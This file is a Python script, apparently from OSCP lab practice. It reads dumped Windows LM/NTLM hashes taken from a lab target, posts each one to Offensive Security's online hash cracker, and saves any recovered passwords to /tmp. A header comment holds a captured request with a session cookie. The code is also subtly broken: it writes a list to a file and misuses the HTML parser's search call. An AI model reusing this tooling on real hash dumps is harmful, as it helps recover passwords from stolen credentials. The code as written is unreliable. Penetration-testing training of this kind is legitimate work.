#!/usr/bin/env python3

# Python script to upload a list of password hashes to https://cracker.offensive-security.com
'''
POST /insert.php HTTP/1.1
Host: cracker.offensive-security.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cracker.offensive-security.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 92
DNT: 1
Connection: close
Cookie: PHPSESSID=tedrb3repcp7uqvape3b3cjoi5
Upgrade-Insecure-Requests: 1

hash=aad3b435b51404eeaad3b435b51404ee%3A8f53ac7dfad4fe8c3e632e6d3becdccd&priority=1337123456
'''
import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring

proxies = {
    "http" : "http://192.168.1.232:8080"
}
hash_file = '/root/oscplab/labtargets/dot227/jdhashes.list'

with open(hash_file) as f:
    for line in f:
        linesplit = line.split(":")
        username = linesplit[0]
        userLMhash = linesplit[2]
        userNTLMhash = linesplit[3]

        for userhash in [userLMhash, userNTLMhash]:
            payload = {'hash': userhash, 'priority': '1337123456'}

            r = requests.post("https://cracker.offensive-security.com/insert.php", data=payload)
            #print(r.content)

            cracksoup = BeautifulSoup(r.content, "html.parser")

            dev_id = cracksoup.find(id="success")

            if dev_id:
                print("\n", username, ":", userhash)
                print(dev_id)

                with open ('/tmp/cracked.txt', 'a') as output:
                    usercolonhash = "\n" + username + ":" + userhash
                    output.write(usercolonhash)
                    printdevid = dev_id.find_all('plaintext')
                    if printdevid:
                        output.write(printdevid)

                plaintextyes = dev_id.find_all(div="plaintext")

                if plaintextyes:
                    print("\n", username, ":", userhash)
                    print(plaintextyes)

